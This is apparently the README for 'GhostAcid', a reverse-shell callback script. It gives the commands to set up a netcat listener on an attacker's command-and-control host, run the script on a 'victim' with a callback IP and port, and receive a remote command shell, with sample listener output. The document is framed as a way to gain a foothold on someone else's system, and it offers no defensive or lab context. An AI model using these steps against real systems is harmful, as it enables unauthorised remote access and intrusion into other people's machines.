# GHOSTACID

GhostAcid is a very simple callback script designed to work with a ncat listener.  It should allow the user to get a foothold onto a system and allow for further recon and enumeration.

#### On your C2

Set up a simple netcat listener for incomming connections

```bash
nc -lvvp 8080
```

#### On your victim

Simply call the script and pass your callback IP and port

```python
./ghostacid.py -i 127.0.0.1 -p 8080
```

#### The callback

Your netcat listener will return with a command shell from your victim

```bash
Listening on [0.0.0.0] (family 0, port 8080)
Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 56034)
ubuntu@localhost /home/ubuntu/workspace/ghostacid $
```